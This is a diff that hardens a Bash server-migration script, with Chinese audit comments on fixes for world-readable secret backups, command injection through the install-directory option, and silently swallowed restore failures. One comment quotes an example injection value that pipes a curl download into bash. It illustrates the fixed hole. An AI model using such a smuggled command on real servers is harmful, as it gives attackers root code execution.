@@ -36,7 +36,18 @@ MODE=""
 SOURCE=""
 TARGET=""
 INSTALL_DIR="/opt/gipfel"
-BACKUP_DIR="/tmp/gipfel-migration-$(date +%Y%m%d_%H%M%S)"
+# 审计 X-02：改前是 `/tmp/gipfel-migration-<ts>` 里放 `.env`（含 JWT_SECRET / DJANGO_SECRET_KEY
+# 等全部密钥），目录由 umask 决定权限（通常 755）、内容 644 ⇒ 同机任意用户可读；
+# 且脚本没有任何清理逻辑，迁移中途失败会长期残留。现在用 `mktemp -d`（自带 700）
+# 并注册退出清理（`--keep-backup` 可保留，便于排障）。
+BACKUP_DIR="$(mktemp -d "${TMPDIR:-/tmp}/gipfel-migration-XXXXXX")"
+KEEP_BACKUP=false
+_cleanup_backup() {
+    if [[ "$KEEP_BACKUP" != true && "$DRY_RUN" != true && -n "$BACKUP_DIR" && -d "$BACKUP_DIR" ]]; then
+        rm -rf "$BACKUP_DIR"
+    fi
+}
+trap _cleanup_backup EXIT INT TERM
 SKIP_SERVICES=false
 DRY_RUN=false
 SSH_PORT=22
@@ -52,8 +63,9 @@ usage() {
   --mode pull --source USER@HOST    拉取模式：从源服务器拉取到本机
 
 可选参数：
-  --install-dir DIR     安装目录（默认: /opt/gipfel）
-  --backup-dir DIR      临时备份目录（默认: /tmp/gipfel-migration-<时间戳>）
+  --install-dir DIR     安装目录（默认: /opt/gipfel；只允许绝对路径与 [A-Za-z0-9._/-]）
+  --backup-dir DIR      临时备份目录（默认: mktemp -d，权限 700，退出时自动清理）
+  --keep-backup         保留临时备份目录（默认退出时清理，避免含密钥的 .env 长期残留）
   --skip-services       跳过服务配置（仅传输数据）
   --dry-run             模拟运行，不实际执行
   --ssh-port PORT       SSH 端口（默认: 22）
@@ -80,6 +92,7 @@ while [[ $# -gt 0 ]]; do
         --target)     TARGET="$2"; shift 2 ;;
         --install-dir) INSTALL_DIR="$2"; shift 2 ;;
         --backup-dir) BACKUP_DIR="$2"; shift 2 ;;
+        --keep-backup) KEEP_BACKUP=true; shift ;;
         --skip-services) SKIP_SERVICES=true; shift ;;
         --dry-run)    DRY_RUN=true; shift ;;
         --ssh-port)   SSH_PORT="$2"; shift 2 ;;
@@ -105,13 +118,29 @@ if [[ "$MODE" == "pull" && -z "$SOURCE" ]]; then
     usage
 fi
 
-# SSH 命令构建
-SSH_OPTS="-p $SSH_PORT -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10"
-if [[ -n "$SSH_KEY" ]]; then
-    SSH_OPTS="$SSH_OPTS -i $SSH_KEY"
+# 审计 X-03：`--install-dir` 会被拼进远端命令里由 root shell 执行，必须先做**白名单校验**。
+# 改前无任何校验：含空格会创建出错误目录（`/opt/my app/backend` → `/opt/my` 与 `app/backend`），
+# 含 shell 元字符则可让目标机以 root 执行任意命令（`--install-dir '/opt/gipfel;curl x|bash'`）。
+if [[ "$INSTALL_DIR" != /* || ! "$INSTALL_DIR" =~ ^/[A-Za-z0-9._/-]+$ ]]; then
+    log_error "--install-dir 必须是绝对路径且只含 [A-Za-z0-9._/-]（收到: $INSTALL_DIR）"
+    exit 1
+fi
+if [[ "$INSTALL_DIR" == *".."* ]]; then
+    log_error "--install-dir 不得包含 '..'（收到: $INSTALL_DIR）"
+    exit 1
 fi
 
-RSYNC_SSH="ssh $SSH_OPTS"
+# SSH 命令构建
+# 审计 X-03：改前用字符串累加（`SSH_OPTS="... -i $SSH_KEY"`）再交给 `ssh $SSH_OPTS`，
+# 键路径含空格时会被分词拆开；改为 bash 数组后每个参数都是一个独立 argv。
+SSH_OPTS=(-p "$SSH_PORT" -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 -o BatchMode=yes)
+if [[ -n "$SSH_KEY" ]]; then
+    SSH_OPTS+=(-i "$SSH_KEY")
+fi
+
+# `-e` 的参数是「一条命令字符串」，这里用 printf %q 转义后拼装
+printf -v _ssh_opts_q '%q ' "${SSH_OPTS[@]}"
+RSYNC_SSH="ssh ${_ssh_opts_q% }"
 
 # ==================== 辅助函数 ====================
 
@@ -119,7 +148,7 @@ RSYNC_SSH="ssh $SSH_OPTS"
 check_remote_command() {
     local host="$1"
     local cmd="$2"
-    ssh $SSH_OPTS "$host" "command -v $cmd >/dev/null 2>&1" 2>/dev/null
+    ssh "${SSH_OPTS[@]}" "$host" "command -v $cmd >/dev/null 2>&1" 2>/dev/null
 }
 
 # 在远程执行命令
@@ -130,7 +159,21 @@ remote_exec() {
         log_info "[DRY-RUN] 远程执行: $*"
         return 0
     fi
-    ssh $SSH_OPTS "$host" "$@"
+    ssh "${SSH_OPTS[@]}" "$host" "$@"
+}
+
+# 在远端以 root 执行一条命令；参数逐个用 printf %q 转义后再拼接（审计 X-03）。
+# 用法：remote_sudo "$REMOTE" mkdir -p "$INSTALL_DIR/backend" "$INSTALL_DIR/frontend-dist"
+remote_sudo() {
+    local host="$1"
+    shift
+    local quoted=""
+    local arg
+    for arg in "$@"; do
+        printf -v arg_q '%q' "$arg"
+        quoted+="$arg_q "
+    done
+    remote_exec "$host" "sudo ${quoted% }"
 }
 
 # rsync 传输
@@ -189,7 +232,7 @@ if [[ "$MODE" == "push" ]]; then
     log_info "源目录检查通过"
 
     log_step "[2/6] 检查目标服务器连接..."
-    if ! ssh $SSH_OPTS "$REMOTE" "echo ok" >/dev/null 2>&1; then
+    if ! ssh "${SSH_OPTS[@]}" "$REMOTE" "echo ok" >/dev/null 2>&1; then
         log_error "无法连接到目标服务器: $REMOTE"
         log_error "请检查 SSH 连接和防火墙设置"
         exit 1
@@ -206,9 +249,9 @@ if [[ "$MODE" == "push" ]]; then
         fi
     done
 
-    # 在目标创建安装目录
+    # 在目标创建安装目录（审计 X-03：改用逐参数转义的 remote_sudo，不再拼裸字符串）
     log_step "[4/6] 准备目标目录..."
-    remote_exec "$REMOTE" "sudo mkdir -p $INSTALL_DIR/backend $INSTALL_DIR/frontend-dist"
+    remote_sudo "$REMOTE" mkdir -p "$INSTALL_DIR/backend" "$INSTALL_DIR/frontend-dist"
 
     # 同步数据文件
     log_step "[5/6] 同步数据文件..."
@@ -217,8 +260,13 @@ if [[ "$MODE" == "push" ]]; then
         if [[ -e "$src" ]]; then
             log_info "同步: $item"
             # 确保目标目录存在
-            remote_exec "$REMOTE" "sudo mkdir -p $(dirname $INSTALL_DIR/$item)"
-            rsync_transfer "$src" "$REMOTE:$(dirname $INSTALL_DIR/$item)/"
+            remote_sudo "$REMOTE" mkdir -p "$(dirname "$INSTALL_DIR/$item")"
+            # 审计 X-02：`.env` 含全部密钥，传输时**强制 600**（改前依赖 umask，落到 644 世界可读）
+            if [[ "$item" == *".env" ]]; then
+                rsync_transfer "$src" "$REMOTE:$(dirname "$INSTALL_DIR/$item")/" "--chmod=F600"
+            else
+                rsync_transfer "$src" "$REMOTE:$(dirname "$INSTALL_DIR/$item")/"
+            fi
         else
             log_warn "跳过（不存在）: $item"
         fi
@@ -233,13 +281,11 @@ if [[ "$MODE" == "push" ]]; then
 
     rsync_transfer "$INSTALL_DIR/deploy/" "$REMOTE:$INSTALL_DIR/deploy/"
 
-    # 修复权限
+    # 修复权限（审计 X-03：用 remote_sudo 逐参数转义；chmod/chown 的参数不再裸拼）
     log_info "修复文件权限..."
-    remote_exec "$REMOTE" "
-        sudo chown -R gipfel:gipfel $INSTALL_DIR/backend 2>/dev/null || true
-        sudo chmod 600 $INSTALL_DIR/backend/.env 2>/dev/null || true
-        sudo chmod 755 $INSTALL_DIR/backend/uploads 2>/dev/null || true
-    "
+    remote_exec "$REMOTE" "sudo chown -R gipfel:gipfel '$INSTALL_DIR/backend' 2>/dev/null || true"
+    remote_exec "$REMOTE" "sudo chmod 600 '$INSTALL_DIR/backend/.env' 2>/dev/null || true"
+    remote_exec "$REMOTE" "sudo chmod 755 '$INSTALL_DIR/backend/uploads' 2>/dev/null || true"
 
     # 服务配置
     if [[ "$SKIP_SERVICES" == false ]]; then
@@ -251,8 +297,8 @@ if [[ "$MODE" == "push" ]]; then
             fi
 
             # 安装 systemd 服务
-            sudo cp $INSTALL_DIR/deploy/gipfel.service /etc/systemd/system/
-            sudo cp $INSTALL_DIR/deploy/logviewer.service /etc/systemd/system/
+            sudo cp '$INSTALL_DIR/deploy/gipfel.service' /etc/systemd/system/
+            sudo cp '$INSTALL_DIR/deploy/logviewer.service' /etc/systemd/system/
             sudo systemctl daemon-reload
 
             # 提示用户手动完成剩余配置
@@ -299,7 +345,7 @@ elif [[ "$MODE" == "pull" ]]; then
     REMOTE="$SOURCE"
 
     log_step "[1/6] 检查源服务器连接..."
-    if ! ssh $SSH_OPTS "$REMOTE" "echo ok" >/dev/null 2>&1; then
+    if ! ssh "${SSH_OPTS[@]}" "$REMOTE" "echo ok" >/dev/null 2>&1; then
         log_error "无法连接到源服务器: $REMOTE"
         exit 1
     fi
@@ -325,7 +371,7 @@ elif [[ "$MODE" == "pull" ]]; then
         local_path="$BACKUP_DIR/$item"
 
         # 检查远程文件是否存在
-        if ssh $SSH_OPTS "$REMOTE" "test -e $INSTALL_DIR/$item" 2>/dev/null; then
+        if ssh "${SSH_OPTS[@]}" "$REMOTE" "test -e $INSTALL_DIR/$item" 2>/dev/null; then
             log_info "拉取: $item"
             mkdir -p "$(dirname "$local_path")"
             rsync_transfer "$remote_path" "$(dirname "$local_path")/"
@@ -344,6 +390,7 @@ elif [[ "$MODE" == "pull" ]]; then
 
     # 恢复到本地安装目录
     log_step "[5/6] 恢复到本地安装目录..."
+    RESTORED_ITEMS=()
     if [[ "$DRY_RUN" == false ]]; then
         mkdir -p "$INSTALL_DIR"
         # 备份现有数据（如有）
@@ -351,19 +398,53 @@ elif [[ "$MODE" == "pull" ]]; then
             local existing_backup="$INSTALL_DIR/_backup/$(date +%Y%m%d_%H%M%S)"
             log_info "备份现有数据到: $existing_backup"
             mkdir -p "$existing_backup"
-            cp -a "$INSTALL_DIR/backend/db.sqlite3" "$existing_backup/" 2>/dev/null || true
-            cp -a "$INSTALL_DIR/backend/.env" "$existing_backup/" 2>/dev/null || true
-            cp -a "$INSTALL_DIR/backend/uploads" "$existing_backup/" 2>/dev/null || true
+            # 审计 X-04：这里是「本机原有数据」的唯一副本，失败必须显式报错（改前是 `|| true` 吞掉）
+            for keep in backend/db.sqlite3 backend/.env backend/uploads; do
+                if [[ -e "$INSTALL_DIR/$keep" ]]; then
+                    if ! cp -a "$INSTALL_DIR/$keep" "$existing_backup/"; then
+                        log_error "备份本机原有数据失败: $keep —— 已中止，避免继续覆盖"
+                        exit 1
+                    fi
+                fi
+            done
         fi
 
-        # 恢复数据
-        cp -a "$BACKUP_DIR/backend/db.sqlite3" "$INSTALL_DIR/backend/" 2>/dev/null || true
-        cp -a "$BACKUP_DIR/backend/.env" "$INSTALL_DIR/backend/" 2>/dev/null || true
-        cp -a "$BACKUP_DIR/backend/uploads" "$INSTALL_DIR/backend/" 2>/dev/null || true
-        cp -a "$BACKUP_DIR/backend/logs" "$INSTALL_DIR/backend/" 2>/dev/null || true
-        cp -a "$BACKUP_DIR/backend/staticfiles" "$INSTALL_DIR/backend/" 2>/dev/null || true
-        cp -a "$BACKUP_DIR/frontend-dist" "$INSTALL_DIR/" 2>/dev/null || true
-        cp -a "$BACKUP_DIR/deploy" "$INSTALL_DIR/" 2>/dev/null || true
+        # 审计 X-04：改前每条 `cp -a ... 2>/dev/null || true` 会把失败吞掉，随后仍打印
+        # 「拉取完成！数据已恢复到 …」—— 新机上没有 db.sqlite3 时 Django 会新建空库并 migrate，
+        # 表现为「迁移成功但数据全没了」，运维很可能据此删掉旧服务器（不可逆）。
+        # 现在：关键项（数据库/配置/上传）失败即中止；其余项失败如实记入问题列表。
+        RESTORE_FAILED=()
+        for item in "backend/db.sqlite3" "backend/.env" "backend/uploads" \
+                    "backend/logs" "backend/staticfiles" "frontend-dist" "deploy"; do
+            src="$BACKUP_DIR/$item"
+            if [[ ! -e "$src" ]]; then
+                if [[ "$item" == "backend/db.sqlite3" ]]; then
+                    log_error "拉取结果里没有 backend/db.sqlite3 —— 数据库未成功拉取，已中止恢复"
+                    exit 1
+                fi
+                continue
+            fi
+            if cp -a "$src" "$INSTALL_DIR/$(dirname "$item")/"; then
+                RESTORED_ITEMS+=("$item")
+            else
+                log_error "恢复失败: $item"
+                RESTORE_FAILED+=("$item")
+            fi
+        done
+
+        # 恢复后必须真的校验数据库（非空 + SQLite 文件头）
+        db_path="$INSTALL_DIR/backend/db.sqlite3"
+        if [[ ! -s "$db_path" ]]; then
+            log_error "恢复后数据库缺失或为空: $db_path（已中止，未报告成功）"
+            exit 1
+        fi
+        if [[ "$(head -c 15 "$db_path" 2>/dev/null || true)" != "SQLite format 3" ]]; then
+            log_error "恢复后的数据库不是合法 SQLite 文件: $db_path（已中止，未报告成功）"
+            exit 1
+        fi
+        if [[ ${#RESTORE_FAILED[@]} -gt 0 ]]; then
+            log_error "以下条目恢复失败：${RESTORE_FAILED[*]}（数据库本身已校验通过）"
+        fi
     fi
 
     # 服务配置
@@ -387,8 +468,14 @@ elif [[ "$MODE" == "pull" ]]; then
     fi
 
     log_info "=========================================="
-    log_info "拉取完成！数据已恢复到: $INSTALL_DIR"
-    log_info "备份保存在: $BACKUP_DIR"
+    # 审计 X-04：收尾按**事实**报告（列出实际恢复成功的条目），不再无条件宣称「数据已恢复」
+    log_info "拉取完成！已恢复条目: ${RESTORED_ITEMS[*]:-（无）}"
+    log_info "数据库已校验: $INSTALL_DIR/backend/db.sqlite3（非空 + SQLite 文件头）"
+    if [[ "$KEEP_BACKUP" == true ]]; then
+        log_info "备份保存在: $BACKUP_DIR"
+    else
+        log_info "备份目录（退出时自动清理，如需保留请加 --keep-backup）: $BACKUP_DIR"
+    fi
     log_info "=========================================="
     log_info ""
     log_info "请完成以下步骤："
